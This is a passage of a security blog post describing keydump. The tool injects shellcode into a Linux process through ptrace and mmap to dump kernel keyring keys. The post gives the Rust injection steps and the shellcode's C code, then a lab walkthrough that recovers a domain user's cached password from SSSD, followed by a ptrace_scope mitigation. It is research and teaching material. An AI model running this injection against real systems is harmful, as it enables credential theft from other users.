+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust">tracer::basics::attach_process(pid)<span style="color:#f92672">?</span>;
+</code></pre></div>
+</div>
+<p>
+This steps requires to perform a <code>PTRACE_ATTACH</code> operation in the ptrace syscall
+and waiting for the process to effectively stops.</p>
+</div>
+</div>
+<div id="outline-container-2-look-for-a-syscall-instruction" class="outline-4">
+<h4 id="2-look-for-a-syscall-instruction">
+2. Look for a syscall instruction
+</h4>
+<div id="outline-text-2-look-for-a-syscall-instruction" class="outline-text-4">
+<div class="src src-rust">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#66d9ef">let</span> syscall_addr <span style="color:#f92672">=</span> tracer::x64::syscall::search_syscall_inst_nearby(pid)<span style="color:#f92672">?</span>;
+</code></pre></div>
+</div>
+<p>
+In next steps we require to call an mmap syscall in order to allocate memory for
+the shellcode. In order to do that we need to redirect the execution of the
+program to a syscall instruction by setting the syscall instruction address in
+the the program counter, which is the <code>rip</code> register in x64. </p>
+<p>
+Therefore we need to find a syscall instruction inside the process memory. Since
+usually after tracing a process this is stopped when calling a syscall I&#39;m going
+to check if that is the case and store the syscall instruction address. In other
+case my program failed, but a memory scanning could be implemented for searching
+for a syscall instruction, or we could resume the process execution until a
+syscall is executed (can be done with <code>PTRACE_SYSCALL</code>).</p>
+</div>
+</div>
+<div id="outline-container-3-execute-mmap-to-allocate-memory-for-the-shellcode" class="outline-4">
+<h4 id="3-execute-mmap-to-allocate-memory-for-the-shellcode">
+3. Execute mmap to allocate memory for the shellcode
+</h4>
+<div id="outline-text-3-execute-mmap-to-allocate-memory-for-the-shellcode" class="outline-text-4">
+<div class="src src-rust">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#66d9ef">let</span> mmap_addr <span style="color:#f92672">=</span> tracer::x64::syscall::exec_mmap_x64(
+        pid,
+        syscall_addr,
+        <span style="color:#ae81ff">0</span>,
+        shc.len() <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u64</span>,
+        libc::PROT_READ <span style="color:#f92672">|</span> libc::PROT_WRITE <span style="color:#f92672">|</span> libc::PROT_EXEC,
+        libc::MAP_PRIVATE <span style="color:#f92672">|</span> libc::MAP_ANONYMOUS,
+        <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
+        <span style="color:#ae81ff">0</span>,
+    )<span style="color:#f92672">?</span>;
+</code></pre></div>
+</div>
+<p>
+In order to perform an <a href="https://www.man7.org/linux/man-pages/man2/mmap.2.html">mmap syscall</a>, we need to set the <code>rip</code> registry pointing to
+the syscall instruction we have found and passing the arguments to
+mmap by setting them in the proper registers which are <code>rdi</code>, <code>rsi</code>, <code>rdx</code>,
+<code>r10</code>, <code>r8</code>, <code>r9</code><sup class="footnote-reference"><a id="footnote-reference-3" href="#footnote-3">3</a></sup>. Notice that we need to
+reserve a memory section which allows us to write and execute (and read) for
+writing and executing the shellcode (besides, in this case our shellcode also
+require these permission for proper execution). </p>
+<p>
+However, before setting the registers, we need to save the register original
+values to restore then afterwards. Once this is done, we execute the syscall
+instruction by just performing a single-step operation which only executes one
+instruction (the syscall instruction). Then we retrieve the value returned by
+the mmap syscall, stored in <code>rax</code> registry, and restore the registers to their
+original values to avoid disrupting the target process.</p>
+</div>
+</div>
+<div id="outline-container-4-copy-the-shellcode-into-remote-process-memory" class="outline-4">
+<h4 id="4-copy-the-shellcode-into-remote-process-memory">
+4. Copy the shellcode into remote process memory
+</h4>
+<div id="outline-text-4-copy-the-shellcode-into-remote-process-memory" class="outline-text-4">
+<div class="src src-rust">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust">tracer::x64::basics::write_memory_x64(pid, map_addr, shc)<span style="color:#f92672">?</span>;
+</code></pre></div>
+</div>
+<p>
+As result of the mmap syscall, we have reserved a memory region to
+which write our shellcode. We can do this by writing the shellcode bytes into
+the <code class="verbatim">/proc/&lt;pid&gt;/mem</code> pseudo-file, where pid is the pid of the target process.</p>
+</div>
+</div>
+<div id="outline-container-5-call-the-shellcode" class="outline-4">
+<h4 id="5-call-the-shellcode">
+5. Call the shellcode
+</h4>
+<div id="outline-text-5-call-the-shellcode" class="outline-text-4">
+<div class="src src-rust">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#66d9ef">let</span> rip <span style="color:#f92672">=</span> tracer::x64::register::rip(pid)<span style="color:#f92672">?</span>;
+
+tracer::x64::basics::stack_push_x64(pid, rip <span style="color:#f92672">-</span> rip_offset)<span style="color:#f92672">?</span>;
+
+tracer::x64::register::set_rip(pid, map_addr <span style="color:#f92672">+</span> rip_offset)<span style="color:#f92672">?</span>;
+</code></pre></div>
+</div>
+<p>
+In order to call the shellcode we simply need to set into the <code>rip</code> register the
+address to which we just have copied the shellcode. Besides, since we want to
+restore the real execution flow of the process once our shellcode finish its
+job, we insert into the stack as return value the address where the process was
+stopped.</p>
+<p>
+You may notice the <code class="verbatim">rip_offset</code> variable, what is this? When the target process
+is interrupted by the ptrace attach, it can be in the middle of a syscall. In
+this case, the <code>rip</code> register points to the syscall next instruction, but the
+process needs to be resumed in the syscall instruction to repeat it (since it
+wasn&#39;t completed) and avoid an unexpected behavior. This is precisely what
+happens when the debugger detaches from the process (PTRACE_DETACH operation),
+that the <code>rip</code> is subtracted 2 (the syscall instruction size in x64) so no
+problems arise. And to handle this (not so) special situation I have introduced
+the <code class="verbatim">rip_offset</code> variable whose value is 2 when the target process is stopped
+while calling a syscall.</p>
+<p>
+Thus, I indicate that the address of the shellcode is the allocated address
+(with mmap) plus the offset that will be subtracted when we will detach from the
+target process. Furthermore the return address could be the instruction pointed
+by <code>rip</code> when the process was stopped, or in the case of the situation
+previously described, the previous syscall instruction, so 2 must be subtracted
+from <code>rip</code>.</p>
+<p>
+To sum up, we are simulating a <code class="verbatim">call</code> instruction to invoke our shellcode (it is
+important to notice that it is responsibility of the shellcode, once done, to
+restore the values of the registers so the target process don&#39;t crash). Then,
+when the returned address is pushed to the stack and <code>rip</code> points to our
+shellcode address, we just detach from the target process. When this happens,
+the target process is resumed, executing our shellcode and finally returning to
+its normal execution flow.</p>
+</div>
+</div>
+<div id="outline-container-extra-step-checking-if-the-dump-was-successful" class="outline-4">
+<h4 id="extra-step-checking-if-the-dump-was-successful">
+Extra step: Checking if the dump was successful
+</h4>
+<div id="outline-text-extra-step-checking-if-the-dump-was-successful" class="outline-text-4">
+<p>
+Once the shellcode is injected into the target process, it will create a folder
+under the <code class="verbatim">/tmp/</code> directory which will contain files with the value of the
+target process readable keys. Therefore, after injecting the shellcode, we wait
+for a little period of time and check if such folder was created.</p>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-the-shellcode" class="outline-3">
+<h3 id="the-shellcode">
+The shellcode
+</h3>
+<div id="outline-text-the-shellcode" class="outline-text-3">
+<p>
+The another key part of keydump is the shellcode to inject into the
+target process. To create the shellcode I have used <a href="https://github.com/zer1t0/shellnova">shellnova</a><sup class="footnote-reference"><a id="footnote-reference-4" href="#footnote-4">4</a></sup>, a
+project of mine which provides a template for shellcode creation that includes
+the following:</p>
+<ul>
+<li>
+<p>Creating a shellcode from C code</p>
+</li>
+<li>
+<p>Resolving libc functions on runtime, so we can use them from the shellcode</p>
+</li>
+<li>
+<p>Erasing the implant once the work is done, so no traces are left</p>
+</li>
+</ul>
+<p>The shellcode, as I mentioned in the keyrings section, will list the keys by
+reading the <code class="verbatim">/proc/keys</code> file and will try to read the content of each key and
+saved it into a file under <code class="verbatim">/tmp/k_&lt;tid&gt;/</code> where <code class="verbatim">&lt;tid&gt;</code> is the tid of the
+target thread. Here is the code (from <a href="https://github.com/zer1t0/keydump/blob/1c0a26a959b4409865a511a5549e1eaad3d3d6d8/implant/src/main.c#L145">dump_keys</a> function) that performs such
+actions:</p>
+<figure>
+<div class="src src-c">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    sprintf_d(keys_dir, <span style="color:#e6db74">&#34;/tmp/k_%d&#34;</span>, tid);
+    err <span style="color:#f92672">=</span> mkdir_z(keys_dir, <span style="color:#ae81ff">0755</span>);
+    <span style="color:#66d9ef">if</span> (err <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> err <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>EEXIST) {
+        LOG_PRINTF(<span style="color:#e6db74">&#34;Error mkdir: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
+        <span style="color:#66d9ef">goto</span> close;
+    }
+
+    dp <span style="color:#f92672">=</span> opendir_d(keys_dir);
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>dp) {
+        PRINTF(<span style="color:#e6db74">&#34;Error opendir&#34;</span>);
+        <span style="color:#66d9ef">goto</span> close;
+    }
+    dir_fd <span style="color:#f92672">=</span> dirfd_d(dp);
+
+    fp <span style="color:#f92672">=</span> fopen_d(<span style="color:#e6db74">&#34;/proc/keys&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>fp) {
+        PRINTF(<span style="color:#e6db74">&#34;Error opening /proc/keys&#34;</span>);
+        <span style="color:#66d9ef">goto</span> close;
+    }
+
+    <span style="color:#66d9ef">while</span> ((nread <span style="color:#f92672">=</span> getline_d(<span style="color:#f92672">&amp;</span>line, <span style="color:#f92672">&amp;</span>len, fp)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+        sscanf_d(line, <span style="color:#e6db74">&#34;%lx %s %d %s %x %d %d %s&#34;</span>, <span style="color:#f92672">&amp;</span>k_id, k_flags, <span style="color:#f92672">&amp;</span>k_state, k_expiration, <span style="color:#f92672">&amp;</span>k_perms, <span style="color:#f92672">&amp;</span>k_uid, <span style="color:#f92672">&amp;</span>k_gid, k_type);
+        <span style="color:#66d9ef">if</span>(read_key(k_id, <span style="color:#f92672">&amp;</span>key_data, <span style="color:#f92672">&amp;</span>key_data_size) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+            desc <span style="color:#f92672">=</span> extract_description(line);
+            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>desc) {
+                desc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+            }
+            <span style="color:#75715e">// printf(&#34;%s\n&#34;, desc);
+</span><span style="color:#75715e"></span>            normalize_description(desc);
+            <span style="color:#75715e">// printf(&#34;Key len of %lu\n&#34;, key_data_size);
+</span><span style="color:#75715e"></span>            sprintf_d(k_filename, <span style="color:#e6db74">&#34;%lx_%s_%s&#34;</span>, k_id, k_type, desc);
+            write_to_file(dir_fd, k_filename, key_data, key_data_size);
+            free_d(key_data);
+        }
+    }</code></pre></div>
+</div>
+<figcaption>
+
+</figcaption>
+</figure>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-attacking-sssd" class="outline-2">
+<h2 id="attacking-sssd">
+Attacking SSSD
+</h2>
+<div id="outline-text-attacking-sssd" class="outline-text-2">
+<p>
+Now that we understand the underlying mechanism, it is time for performing the
+actual attack, for which is required to have a domain joined GNU/Linux machine
+through sssd. I&#39;m not going to describe the process here since many tutorials
+exists on the internet:</p>
+<ul>
+<li>
+<p><a href="https://hackliza.gal/en/posts/linux-en-ad/">How to join Debian to Active Directory</a></p>
+</li>
+<li>
+<p><a href="https://www.pierreblazquez.com/2024/02/04/how-to-join-debian-12-to-an-active-directory-domain/">How-To: join Debian 12 to an Active Directory domain</a></p>
+</li>
+<li>
+<p><a href="https://www.redhat.com/sysadmin/linux-active-directory">How to join a Linux system to an Active Directory domain</a></p>
+</li>
+</ul>
+<p>After setting up the lab you must be able to log with ssh into the target
+machine with domain credentials. Like this:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ ssh Administrator@dev.lab@lab-debian
+Administrator@dev.lab@192.168.122.241&#39;s password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 12 22:39:50 2024 from 192.168.122.254
+administrator@dev.lab@debian:~$</code></pre></div>
+</div>
+<p>
+I have used the <code>Administrator</code> account of my domain <code>dev.lab</code> but you can use
+any account of the domain.</p>
+<p>
+Once you have verified that it is possible to access by ssh to the machine with
+a domain account, you need to verify that the <code>krb5_store_password_if_offline</code>
+option is set to <code>true</code> in your sssd configuration (in domain settings), which is the
+default value:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ sudo cat /etc/sssd/sssd.conf
+
+[sssd]
+domains = dev.lab
+config_file_version = 2
+services = nss, pam
+
+[domain/dev.lab]
+default_shell = /bin/bash
+krb5_store_password_if_offline = True
+cache_credentials = True
+krb5_realm = DEV.LAB
+realmd_tags = manages-system joined-with-adcli 
+id_provider = ad
+fallback_homedir = /home/%u@%d
+ad_domain = dev.lab
+use_fully_qualified_names = True
+ldap_id_mapping = True
+access_provider = ad</code></pre></div>
+</div>
+<p>
+In case <code>krb5_store_password_if_offline</code> is not present or setting to <code>false</code>,
+modify the file and set it to <code>true</code>. Then restart the sssd daemon.</p>
+<p>
+Once this is done, disconnect the GNU/Linux machine from the Domain
+Controller. For this you can just turn off the Domain Controller.</p>
+<p>
+Now you will need to access to the machine with two accounts simultaneously: </p>
+<ul>
+<li>
+<p>A domain account that will be the victim </p>
+</li>
+<li>
+<p>A privileged account like root, one with sudo or any user with the
+<code>CAP_SYS_PTRACE</code> capability, that will be the attacker. This account can be
+local or from the domain.</p>
+</li>
+</ul>
+<blockquote>
+<p>Be aware that the domains account you will use are required to login at least
+once before the Domain Controller is disconnected in order their credentials
+(hashes) to be cached into the GNU/Linux machine.</p>
+</blockquote>
+<p>
+You may access first with the domain/victim account using ssh:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ ssh Administrator@dev.lab@lab-debian
+Administrator@dev.lab@192.168.122.241&#39;s password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 12 22:39:50 2024 from 192.168.122.254
+administrator@dev.lab@debian:~$</code></pre></div>
+</div>
+<p>
+You won&#39;t need to use this account anymore, just keep its terminal connected in
+the background.</p>
+<p>
+Now, copy the keydump binary to the target machine (by using scp for
+example). You will be required to compile it in a machine with similar
+characteristics (or in the target machine directly) to avoid glibc version
+problems.</p>
+<p>
+Then, in another terminal, access by using the privileged account, the attacker:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ ssh lab-debian 
+user@192.168.122.241&#39;s password: 
+Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Jul 29 16:46:29 2024 from 192.168.122.254
+user@debian:~$</code></pre></div>
+</div>
+<p>
+Then, as attackers, we can confirm there is another user logged with the <code>who</code>
+command:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">user@debian:~$ who
+user     pts/0        Jul 28 17:04 (192.168.122.254)
+administrator@dev.lab pts/1        Jul 28 16:46 (192.168.122.254)</code></pre></div>
+</div>
+<p>
+And verify that a key that contains the victim password was created:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">user@debian:~$ sudo cat /proc/keys | grep dev.lab
+10bfb037 I--Q---     1 perm 3f010000     0     0 user      Administrator@dev.lab: 10</code></pre></div>
+</div>
+<p>
+As we can see, a key was created with the name of the victim account to store
+its password, but we don&#39;t have permissions for reading, only the possessor
+processes can. We can verify this with the <code>keyctl</code> command (which must be installed):</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">user@debian:~$ sudo keyctl read 0x10bfb037
+keyctl_read_alloc: Permission denied</code></pre></div>
+</div>
+<p>
+Fortunately, we can use keydump to dump keys of the sssd process by passing it
+its pid with the following command:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">user@debian:~$ ps -o pid --no-headers -C sssd | sed &#39;s/ //g&#39; | sudo ./keydump -
+[PID 452] Shellcode injected
+[PID 452] /tmp/k_452 exists, so keys must be dumped!!
+user@debian:~$ sudo cat /tmp/k_452/10bfb037_user_Administrator_dev_lab__10
+S3cur3p4ss</code></pre></div>
+</div>
+<p>
+And success!! We were able to dump the sssd keys and retrieve the victim
+password.</p>
+</div>
+</div>
+<div id="outline-container-prevention" class="outline-2">
+<h2 id="prevention">
+Prevention
+</h2>
+<div id="outline-text-prevention" class="outline-text-2">
+<p>
+Preventing this attack requires no allowing processes to attach to others, which
+can be done with the following command:</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">echo 3 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></pre></div>
+</div>
+<p>
+This configures the <a href="https://www.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html">Yama</a> security module to block ptrace (which also prevents
+reading files like <code class="verbatim">/proc/&lt;pid&gt;/mem</code> and <code class="verbatim">/proc/&lt;pid&gt;/maps</code>). I think it should
+be also possible preventing this attack by using SELinux or Apparmor, but I
+don&#39;t know how to do it.</p>
+</div>
+</div>
+<div id="outline-container-conclusion" class="outline-2">
+<h2 id="conclusion">
+Conclusion
+</h2>
+<div id="outline-text-conclusion" class="outline-text-2">
+<p>
+In this article I have shown how SSSD stores passwords when the Domain
+Controller is not available, how keyrings works and how we can dump keys of
+other processes with keydump. I hope you enjoy reading it and find it useful.</p>
+<p>
+Happy hacking and Free Palestine!!</p>
+</div>
+</div>
+<div id="outline-container-references" class="outline-2">
+<h2 id="references">
+References
+</h2>
+</div>
+<div class="footnotes">
+<hr class="footnotes-separatator">
+<div class="footnote-definitions">
+<div class="footnote-definition">
+<sup id="footnote-1"><a href="#footnote-reference-1">1</a></sup>
+<div class="footnote-body">
+<p>Eloy Pérez González. &#34;keydump&#34;. Github. 14 July, 2024,
+<a href="https://github.com/zer1t0/keydump">https://github.com/zer1t0/keydump</a></p>
+</div>
+</div>
+<div class="footnote-definition">
+<sup id="footnote-2"><a href="#footnote-reference-2">2</a></sup>
+<div class="footnote-body">
+<p>Fob. &#34;Process Injection on Linux - Injecting into Processes&#34;. fob&#39;s
+notebook, 31 May, 2022, <a href="https://blog.f0b.org/2022/05/process-injection-on-linux-injecting-into-processes/">https://blog.f0b.org/2022/05/process-injection-on-linux-injecting-into-processes/</a></p>
+</div>
+</div>
+<div class="footnote-definition">
+<sup id="footnote-3"><a href="#footnote-reference-3">3</a></sup>
+<div class="footnote-body">
+<p>claws. &#34;What are the calling conventions
+for UNIX &amp; Linux system calls (and user-space functions) on i386 and
+x86-64&#34;. Stack Overflow. 18 January, 2024, <a href="https://stackoverflow.com/a/2538212">https://stackoverflow.com/a/2538212</a> </p>
+</div>
+</div>
+<div class="footnote-definition">
+<sup id="footnote-4"><a href="#footnote-reference-4">4</a></sup>
+<div class="footnote-body">
+<p>Eloy Pérez González. &#34;shellnova&#34;. Github. 14 July, 2024,
+<a href="https://github.com/zer1t0/shellnova">https://github.com/zer1t0/shellnova</a> </p>
+</div>
+</div>
+</div>
+</div>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://hackliza.gal/en/tags/linux/">Linux</a>&nbsp;
+            
+              <a href="https://hackliza.gal/en/tags/keyrings/">Keyrings</a>&nbsp;
+            
+              <a href="https://hackliza.gal/en/tags/sssd/">sssd</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://hackliza.gal/en/posts/linux-en-ad/" data-toggle="tooltip" data-placement="top" title="How to join Debian to Active Directory">&larr; Previous Post</a>
+            </li>
+          
+          
+        </ul>
+      
+
+
+      
+        
+          
+          <div class="disqus-comments">
+            <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hackliza" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          </div>
+          
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+      
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/hackliza" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/hackliza" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="" title="RSS">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2024
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://hackliza.gal/en/">Hackliza</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.74.3</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+<script src="https://hackliza.gal/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://hackliza.gal/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
